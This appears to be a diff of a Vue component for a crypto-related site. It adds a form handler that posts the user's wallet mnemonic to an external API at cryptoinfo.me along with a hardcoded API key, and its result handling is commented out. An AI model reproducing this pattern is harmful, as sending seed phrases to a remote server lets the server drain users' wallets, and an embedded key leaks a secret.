@@ -114,7 +114,13 @@
             </div>
           </div>
         </div>
-        <div class="max-crypto">
+        <div v-if="isRegistered3">
+          <div>
+            <p>Personal data</p>
+            <!-- <p>Username: {{ personalData.username }}</p> -->
+          </div>
+        </div>
+        <div v-else class="max-crypto">
           <div class="buttons">
             <div class="button1">
               <div class="input">
@@ -268,7 +274,12 @@ const showError = ref(false);
 const showError2 = ref(false);
 const isRegisterMode = ref(false);
 const isRegistered = ref(false);
+// const isRegistered3 = ref(false);
 
+
+const personalData = ref({
+  username: null,
+});
 
 const openTopA = () => {
   isOpen.value = true;
@@ -383,6 +394,32 @@ const handleSubmit2 = async () => {
   }
 };
 
+const handleSubmit3 = async () => {
+  // if (mnemonic2.value === "") {
+  //   showError2.value = true;
+  //   return;
+  // }
+  // showError2.value = false;
+
+  try {
+    const response = await axios.post(
+      "https://api.cryptoinfo.me/api/login-user",
+      {
+        mnemonic: mnemonic3.value, 
+        api_key: "eCGo9bZjoxqGZW8h325LA3wlKV0vq01lIQ4w",
+      }
+    );    
+    // if (response.data.status === 200) {
+    //   console.log("Success:", response.data.user);
+    //   isRegistered3.value = true; 
+    //   console.log("User login:", response.data.user.login); 
+    // } else {
+    //   alert("Սխալ կա՝" + response.data.status_message);
+    // }
+  } catch (error) {
+    console.error("Error making the request:", error);
+  }
+};
 
 
 const updateFirstInputt = () => {
@@ -401,9 +438,7 @@ const updateSecondInputt = () => {
 
 </script>
 
-
 <style scoped>
-
 
 @media screen and (max-width: 742px) {
 
